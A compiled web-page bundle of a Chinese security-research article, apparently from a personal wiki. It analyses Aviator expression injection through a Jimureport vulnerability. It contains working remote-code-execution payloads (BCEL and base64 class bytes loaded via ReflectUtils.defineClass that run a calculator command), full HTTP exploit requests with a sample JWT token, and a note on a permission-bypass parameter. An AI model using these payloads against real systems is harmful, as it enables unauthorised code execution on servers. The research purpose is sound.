"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[1327],{90165:(e,A,n)=>{n.r(A),n.d(A,{assets:()=>o,contentTitle:()=>i,default:()=>l,frontMatter:()=>c,metadata:()=>r,toc:()=>d});var s=n(85893),a=n(11151);const c={},i="\u7ed3\u5408 Jimureport \u7684\u67d0\u4e2a\u6f0f\u6d1e\u62ab\u9732\u770b Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165",r={id:"java/Expression/Aviator/Aviator",title:"\u7ed3\u5408 Jimureport \u7684\u67d0\u4e2a\u6f0f\u6d1e\u62ab\u9732\u770b Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165",description:"JDK \u9ad8\u7248\u672c\u7684 Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165",source:"@site/docs/02-java/Expression/Aviator/Aviator.md",sourceDirName:"02-java/Expression/Aviator",slug:"/java/Expression/Aviator/",permalink:"/docs/java/Expression/Aviator/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/02-java/Expression/Aviator/Aviator.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"\u8868\u8fbe\u5f0f\u6ce8\u5165",permalink:"/docs/category/\u8868\u8fbe\u5f0f\u6ce8\u5165"},next:{title:"SAST \u4e4b\u8def",permalink:"/docs/java/SAST/"}},o={},d=[{value:"JDK \u9ad8\u7248\u672c\u7684 Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165",id:"jdk-\u9ad8\u7248\u672c\u7684-aviator-\u8868\u8fbe\u5f0f\u6ce8\u5165",level:2},{value:"Jimureport sink",id:"jimureport-sink",level:2},{value:"\u5751\u70b9",id:"\u5751\u70b9",level:2},{value:"jimureport \u4f4e\u7248\u672c\u4e3a\u4ec0\u4e48\u65e0\u6cd5\u89e3\u6790",id:"jimureport-\u4f4e\u7248\u672c\u4e3a\u4ec0\u4e48\u65e0\u6cd5\u89e3\u6790",level:2},{value:"\u9a8c\u8bc1\u731c\u60f3",id:"\u9a8c\u8bc1\u731c\u60f3",level:3},{value:"\u54ea\u91cc\u7684\u53d8\u52a8\uff1f",id:"\u54ea\u91cc\u7684\u53d8\u52a8",level:3}];function t(e){const A={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(A.h1,{id:"\u7ed3\u5408-jimureport-\u7684\u67d0\u4e2a\u6f0f\u6d1e\u62ab\u9732\u770b-aviator-\u8868\u8fbe\u5f0f\u6ce8\u5165",children:"\u7ed3\u5408 Jimureport \u7684\u67d0\u4e2a\u6f0f\u6d1e\u62ab\u9732\u770b Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165"}),"\n",(0,s.jsx)(A.h2,{id:"jdk-\u9ad8\u7248\u672c\u7684-aviator-\u8868\u8fbe\u5f0f\u6ce8\u5165",children:"JDK \u9ad8\u7248\u672c\u7684 Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165"}),"\n",(0,s.jsxs)(A.p,{children:["Aviator \u8868\u8fbe\u5f0f\u6ce8\u5165\u4ee3\u7801\u793a\u4f8b\u89c1 ",(0,s.jsx)(A.a,{href:"https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/Expression/AviatorAttack/src/main/java/com/ppp/aviator/AviatorDemo.java",children:"JavaRce \u9879\u76ee"})," \uff0c\u5728\u4e4b\u524d aviatorscript \u7684",(0,s.jsx)(A.a,{href:"https://github.com/killme2008/aviatorscript/issues/421",children:"\u6f0f\u6d1e\u62ab\u9732"}),"\u7ed9\u51fa\u4e86\u4e86\u5982\u4e0b\u5f62\u5f0f\u7684 payload\uff0c\u5229\u7528 bcel \u6765\u52a0\u8f7d\u5b57\u8282\u7801"]}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:'\'a\'+(c=Class.forName(\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\\"open -a Calculator.app\\") );\n'})}),"\n",(0,s.jsxs)(A.p,{children:["\u63d0\u53d6\u51fa\u5176\u4e2d\u7684 ",(0,s.jsx)(A.code,{children:"Class.forName()"})," \u8c03\u8bd5\u4e00\u4e0b\u4ee3\u7801"]}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{className:"language-java",children:"AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();\nevaluator.execute(\"Class.forName('java.lang.String')\");\n"})}),"\n",(0,s.jsxs)(A.p,{children:["\u901a\u8fc7 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.RuntimeFunctionDelegator#getFunc()"})," \u52a8\u6001\u8c03\u7528 Aviator \u4e2d\u5b9a\u4e49\u7684\u65b9\u6cd5"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807111409385",src:n(95838).Z+"",width:"1830",height:"660"})}),"\n",(0,s.jsxs)(A.p,{children:["\u800c\u6362\u6210\u5168\u9650\u5b9a\u7c7b\u540d\u540e\uff0c\u6267\u884c ",(0,s.jsx)(A.code,{children:"getFunc()"})," \u65b9\u6cd5\u4f1a\u62a5\u9519 ",(0,s.jsx)(A.code,{children:"Function not found: java.lang.Class.forName"})]}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{className:"language-java",children:"AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();\nevaluator.execute(\"java.lang.Class.forName('java.lang.String')\");\n"})}),"\n",(0,s.jsxs)(A.p,{children:["\u8c03\u8bd5\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.utils.Env#resolveClassSymbol(java.lang.String, boolean)"})," \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u662f\u7528\u4e8e\u5c06\u7c7b\u540d\u89e3\u6790\u4e3a\u5bf9\u5e94\u7684 Java \u7c7b\u5bf9\u8c61\u3002"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807111809524",src:n(29446).Z+"",width:"2060",height:"1192"})}),"\n",(0,s.jsx)(A.p,{children:"\u8fd9\u91cc\u7684\u8bdd\u6709\u4e24\u4e2a\u503c\u5f97\u770b\u7684\u5730\u65b9\uff1a"}),"\n",(0,s.jsxs)(A.ol,{children:["\n",(0,s.jsxs)(A.li,{children:["\u4ece\u8fd9\u4e2a\u4ee3\u7801\u7684\u903b\u8f91\u6765\u770b\uff0c\u5982\u679c\u5305\u542b ",(0,s.jsx)(A.code,{children:"."})," \u5219\u76f4\u63a5\u8c03\u7528 ",(0,s.jsx)(A.code,{children:"classForName(name)"})," \u65b9\u6cd5\u6765\u83b7\u53d6\u7c7b\u5bf9\u8c61\uff0c\u6211\u4eec\u6784\u9020\u7684\u662f\u5168\u9650\u5b9a\u7c7b\u540d\uff0c\u4e3a\u4ec0\u4e48\u4f20\u5165\u7684 name \u662f ",(0,s.jsx)(A.code,{children:"java"})]}),"\n",(0,s.jsxs)(A.li,{children:["\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u903b\u8f91\uff0c\u56e0\u4e3a\u4e0d\u5b58\u5728\u7c7b\u540d\u65f6\u4f1a\u5047\u8bbe\u8be5\u7c7b\u96b6\u5c5e\u4e8e ",(0,s.jsx)(A.code,{children:"java.lang"})," \u5305\u4e0b\uff0c\u53ef\u4ee5\u89e3\u91ca\u4e3a\u4ec0\u4e48\u76f4\u63a5\u7528 ",(0,s.jsx)(A.code,{children:"Class.forName()"})," \u53ef\u4ee5\u6267\u884c\u3002"]}),"\n"]}),"\n",(0,s.jsxs)(A.p,{children:["\u7b2c\u4e00\u4e2a\u95ee\u9898\u5b9a\u4f4d\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.runtime.type.AviatorJavaType#getProperty()"})," \u65b9\u6cd5\uff0c\u56e0\u4e3a\u5305\u542b ",(0,s.jsx)(A.code,{children:"."})," \u6240\u4ee5\u88ab\u5206\u5272\u4e3a\u6570\u7ec4\uff0c\u7136\u540e\u5728 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.utils.Reflector#fastGetProperty()"})," \u65b9\u6cd5\u904d\u5386\u9010\u4e2a\u89e3\u6790"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807112532434",src:n(5703).Z+"",width:"1902",height:"396"})}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807112604647",src:n(25019).Z+"",width:"1884",height:"376"})}),"\n",(0,s.jsxs)(A.p,{children:[(0,s.jsx)(A.code,{children:"java.lang"})," \u5305\u4e0b\u7684\u7c7b\u6709\u9650\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u5bfb\u6c42\u7a81\u7834\u3002\u6211\u4eec\u770b\u5230\u8fd8\u6709\u4fe9\u903b\u8f91\uff0c\u7528\u4e8e\u5f15\u5165\u5305\u3001\u7c7b\u3002\u8fd9\u4e2a\u89e3\u7b54\u7b2c\u4e8c\u4e2a\u95ee\u9898\u7684\u7591\u95ee\u3002"]}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{className:"language-java",children:"// from imported packages\nclazz = resolveFromImportedPackages(name);\nif (clazz != null) {\n  return checkIfClassIsAllowed(checkIfAllow, clazz);\n}\n// from imported classes\nclazz = resolveFromImportedSymbols(name, clazz);\nif (clazz != null) {\n  return checkIfClassIsAllowed(checkIfAllow, clazz);\n}\n"})}),"\n",(0,s.jsxs)(A.p,{children:["\u4ee5\u5305\u540d\u4e3a\u4f8b\uff0c\u662f\u8bfb\u53d6\u7684 ",(0,s.jsx)(A.code,{children:"this.importedPackages"})," \u5bf9\u8c61\uff0c\u7d22\u6027\u7528\u7684\u6bd4\u8f83\u5c11\uff0c\u53ef\u4ee5\u5f88\u8f7b\u6613\u7684\u8ddf\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.runtime.function.internal.UseFunction#addSym()"})," \u65b9\u6cd5\u3002"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807113101449",src:n(55738).Z+"",width:"1210",height:"528"})}),"\n",(0,s.jsxs)(A.p,{children:[(0,s.jsx)(A.code,{children:"*"})," \u53f7\u7ed9\u4e86\u5f88\u5927\u7684\u63d0\u793a\uff0c\u7136\u540e\u5c31\u662f\u7ffb\u5b98\u65b9\u6587\u6863\u4e86\uff0c\u627e\u5230\u5f15\u7528 Java \u7c7b\u7684\u8bed\u6cd5 ",(0,s.jsx)(A.a,{href:"https://www.yuque.com/boyan-avfmj/aviatorscript/vk0ubs",children:"https://www.yuque.com/boyan-avfmj/aviatorscript/vk0ubs"})]}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:"use java.util.Date;\n\nlet d = new Date();\n\np(type(d));\np(d);\n"})}),"\n",(0,s.jsxs)(A.p,{children:["\u4e0e\u901a\u8fc7 ",(0,s.jsx)(A.a,{href:"https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K",children:"JavaMethodReflectionFunctionMissing"})," \u8c03\u7528 Java \u65b9\u6cd5\uff08\u57fa\u4e8e\u53cd\u5c04\uff09\u4e0d\u540c\uff0c\u4f7f\u7528 ",(0,s.jsx)(A.code,{children:"use"})," \u53ea\u80fd\u8c03\u7528 ",(0,s.jsx)(A.a,{href:"https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#rjNeD",children:"public static \u65b9\u6cd5"})," \uff0c\u5bf9\u4e8e spring \u6846\u67b6\u53ef\u4ee5\u7528 ",(0,s.jsx)(A.code,{children:"org.springframework.cglib.core.ReflectUtils"})," \u6765\u52a0\u8f7d\u5b57\u8282\u7801\uff0c\u5173\u4e8e\u8fd9\u4e2a\u7684\u5229\u7528\u53ef\u4ee5\u770b\u4e0a\u4e00\u7bc7\u5206\u6790"]}),"\n",(0,s.jsxs)(A.blockquote,{children:["\n",(0,s.jsxs)(A.p,{children:["Link: ",(0,s.jsx)(A.a,{href:"/docs/java/named%20module/",children:"JDK 17+ FreeMarker SSTI\uff1a\u4ece CVE-2023-4450 \u590d\u73b0\u5f15\u51fa MethodHandle \u53e5\u67c4\u3001named module \u673a\u5236\u7814\u7a76"})]}),"\n"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807113150049",src:n(79479).Z+"",width:"1436",height:"302"})}),"\n",(0,s.jsx)(A.p,{children:"\u6240\u4ee5\u6700\u7ec8\u6309\u5176\u8bed\u6cd5\u53ef\u5f97"}),"\n",(0,s.jsx)(A.p,{children:"JDK 8"}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:"use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('org.example.Exec', Base64Utils.decodeFromString('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'), ClassLoader.getSystemClassLoader());\n"})}),"\n",(0,s.jsx)(A.p,{children:"JDK17 \uff0cAviator \u4e2d null \u4e3a nil"}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:"use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString('yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY='), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));\n"})}),"\n",(0,s.jsx)(A.h2,{id:"jimureport-sink",children:"Jimureport sink"}),"\n",(0,s.jsxs)(A.p,{children:["\u6f0f\u6d1e\u4f4d\u4e8e ",(0,s.jsx)(A.code,{children:"/save"})," \u548c ",(0,s.jsx)(A.code,{children:"/show"})," \u8fd9\u4e24\u4e2a\u63a5\u53e3\uff0c\u4e24\u4e2a\u5305\u95f4\u901a\u8fc7 ",(0,s.jsx)(A.code,{children:"excel_config_id"})," \u5173\u8054"]}),"\n",(0,s.jsx)(A.p,{children:"\u51fd\u6570\u540d\u6709\u70b9\u62bd\u8c61\u5c31\u4e0d\u6162\u6162\u622a\u56fe\u4e86\uff0c\u4e24\u4e2a\u63a5\u53e3\u5bf9\u5e94\u51fd\u6570"}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:"org.jeecg.modules.jmreport.desreport.service.a.e#saveReport()\n\norg.jeecg.modules.jmreport.desreport.service.a.e#show()\n"})}),"\n",(0,s.jsxs)(A.p,{children:["\u5728\u6267\u884c ",(0,s.jsx)(A.code,{children:"/show"})," \u65f6\uff0c\u8ddf\u8fdb\u5230 ",(0,s.jsx)(A.code,{children:"org.jeecg.modules.jmreport.desreport.express.a#c()"})," \u51fd\u6570\uff0c\u5bf9\u4e8e\u4f20\u5165\u7684\u683c\u5f0f\u6709\u8981\u6c42\u3002\u58f0\u660e\u4e86\u89e3\u6790\u7684\u5b57\u6bb5\u4e3a text\uff0c\u5e76\u4e14\u5185\u5bb9\u5f97\u901a\u8fc7 ",(0,s.jsx)(A.code,{children:"=()"})," \u5305\u542b"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807121741077",src:n(41361).Z+"",width:"1876",height:"1058"})}),"\n",(0,s.jsxs)(A.p,{children:["\u81f3\u4e8e ",(0,s.jsx)(A.code,{children:"/jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI="})," \u5219\u662f\u7528\u4e8e jeeboot \u7684\u6743\u9650\u7ed5\u8fc7"]}),"\n",(0,s.jsx)(A.p,{children:"payload:"}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{className:"language-http",children:'POST /jmreport/save HTTP/1.1\nHost: localhost:8085\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: application/json, text/plain, */*\nContent-Type: application/json\n\n\n{\n    "loopBlockList": [],\n    "area": false,\n    "printElWidth": 718,\n    "excel_config_id": "53c82a76f837d5661dceec7d93afep",\n    "printElHeight": 1047,\n    "rows": {\n        "4": {\n            "cells": {\n                "4": {\n                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass(\'com.ppp.Exec\', Base64Utils.decodeFromString(\'yv66vgAAADQANAoADAAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQIACUIACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxjb20vcHBwL0V4ZWM7AQANU3RhY2tNYXBUYWJsZQcAJwcAJAEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwADQAOBwApDAAqACsBAARFeGVjBwAsDAAtAC4HAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtzdGF0aWMgRXhlYwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHABAAxjb20vcHBwL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAsADAAAAAAAAgABAA0ADgABAA8AAAB2AAIAAgAAABoqtwABsgACEgO2AAS4AAUSBrYAB1enAARMsQABAAQAFQAYAAgAAwAQAAAAGgAGAAAABwAEAAkADAAKABUADAAYAAsAGQANABEAAAAMAAEAAAAaABIAEwAAABQAAAAQAAL/ABgAAQcAFQABBwAWAAAIABcADgABAA8AAABbAAIAAQAAABayAAISCbYABLgABRIKtgAHV6cABEuxAAEAAAARABQACAADABAAAAAWAAUAAAARAAgAEgARABQAFAATABUAFQARAAAAAgAAABQAAAAHAAJUBwAWAAABABgAAAACABk=\'), ClassLoader.getSystemClassLoader());)",\n                    "style": 0\n                }\n            },\n            "height": 25\n        },\n        "len": 96,\n        "-1": {\n            "cells": {\n                "-1": {\n                    "text": "${gongsi.id}"\n                }\n            },\n            "isDrag": true\n        }\n    },\n    "dbexps": [],\n    "toolPrintSizeObj": {\n        "printType": "A4",\n        "widthPx": 718,\n        "heightPx": 1047\n    },\n    "dicts": [],\n    "freeze": "A1",\n    "dataRectWidth": 701,\n    "background": false,\n    "name": "sheet1",\n    "autofilter": {},\n    "styles": [\n        {\n            "align": "center"\n        }\n    ],\n    "validations": [],\n    "cols": {\n        "4": {\n            "width": 95\n        },\n        "len": 50\n    },\n    "merges": [\n        "E4:F4",\n        "B4:B5",\n        "C4:C5",\n        "D4:D5",\n        "G4:G5",\n        "H4:H5",\n        "I4:I5",\n        "D1:G1",\n        "H3:I3"\n    ]\n}\n'})}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{className:"language-http",children:'POST /jmreport/show HTTP/1.1\nHost: localhost:8085\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\nX-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTQ2Mjk0NjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.--r2FRXzk7Nu2_Zrbcdn_0sN3c0zKhKeei2yewFTLx0\nAccept: application/json, text/plain, */*\nContent-Type: application/json\n\n\n{\n    "id": "53c82a76f837d5661dceec7d93afep"\n}\n\n\n'})}),"\n",(0,s.jsx)(A.h2,{id:"\u5751\u70b9",children:"\u5751\u70b9"}),"\n",(0,s.jsx)(A.p,{children:"\u80fd\u7ee7\u7eed\u770b\u4e0b\u6765\u7684\u5e94\u8be5\u4e5f\u53d1\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u7b49\u8981\u8bd5\u56fe\u6ce8\u5165\u5185\u5b58\u9a6c\u65f6\uff0c\u4f1a\u53d1\u73b0\u4e00\u4e2a\u6b63\u5219\u7684\u6808\u6ea2\u51fa\uff0c\u662f\u7531\u4e8e\u8fd9\u6bb5\u5339\u914d\u3002"}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240819101851786",src:n(85988).Z+"",width:"1890",height:"472"})}),"\n",(0,s.jsx)(A.p,{children:"\u89e3\u51b3\u65b9\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u5957\u4e00\u5c42\u7f16\u7801"}),"\n",(0,s.jsx)(A.pre,{children:(0,s.jsx)(A.code,{children:"=(use org.springframework.cglib.core.*;use org.springframework.util.*;use java.net.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString(URLDecoder.decode('%79')), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));)\n"})}),"\n",(0,s.jsx)(A.h2,{id:"jimureport-\u4f4e\u7248\u672c\u4e3a\u4ec0\u4e48\u65e0\u6cd5\u89e3\u6790",children:"jimureport \u4f4e\u7248\u672c\u4e3a\u4ec0\u4e48\u65e0\u6cd5\u89e3\u6790"}),"\n",(0,s.jsxs)(A.p,{children:["\u7528\u6700\u65b0\u7248\u7684 1.7.8 \u53ef\u4ee5\u590d\u73b0\uff0c\u800c\u7528\u5230 1.6.0 \u65f6\u53d1\u73b0\u8c03\u7528\u7684\u662f ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.runtime.function.TraceFunction#call(java.util.Map<java.lang.String,java.lang.Object>, com.googlecode.aviator.runtime.type.AviatorObject, com.googlecode.aviator.runtime.type.AviatorObject)"})," \u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e76\u4e14\u5728\u6267\u884c ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.runtime.function.TraceFunction#traceArgs()"})," \u65f6\u62a5\u9519\u3002"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807143426654",src:n(5527).Z+"",width:"1964",height:"306"})}),"\n",(0,s.jsxs)(A.p,{children:["\u56de\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.ClassExpression#executeDirectly()"})," \u65b9\u6cd5\u770b\u770b\u5728\u8c03\u7528 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.ClassExpression#execute0"})," \u524d\u53d1\u751f\u4e86\u4ec0\u4e48\u3002"]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807143843482",src:n(88656).Z+"",width:"1714",height:"528"})}),"\n",(0,s.jsxs)(A.p,{children:["Avaitor \u7684\u5e95\u5c42\u4e5f\u7528\u7684\u662f ASM \u5c06\u8868\u8fbe\u5f0f\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff0c\u8fd9\u91cc\u6ca1\u6cd5\u6b65\u8fdb\u8c03\u8bd5\u65e0\u7591\u662f\u4e0a\u4e86\u4e00\u70b9\u96be\u5ea6\u3002\u4e0d\u8fc7\u6ca1\u5173\u7cfb\uff0c\u5c06\u4f9d\u8d56\u5355\u72ec\u53d6\u51fa payload \u53ef\u7528\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u95ee\u9898\u51fa\u5728\u914d\u7f6e\u9879\uff0c\u4e8e\u662f\u627e\u4e86\u4e00\u4e0b\u4ee3\u7801\u5b9a\u4f4d\u5230 ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.Options#TRACE_EVAL"})," \u8fd9\u4e2a\u914d\u7f6e\u3002\u5173\u4e8e ",(0,s.jsx)(A.code,{children:"TRACE_EVAL"})," \u7684 ASM \u903b\u8f91\u4f4d\u4e8e ",(0,s.jsx)(A.code,{children:"com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName"})]}),"\n",(0,s.jsx)(A.p,{children:(0,s.jsx)(A.img,{alt:"image-20240807144306254",src:n(35085).Z+"",width:"1996",height:"530"})}),"\n",(0,s.jsxs)(A.p,{children:["PS. \u5173\u4e8e ASM 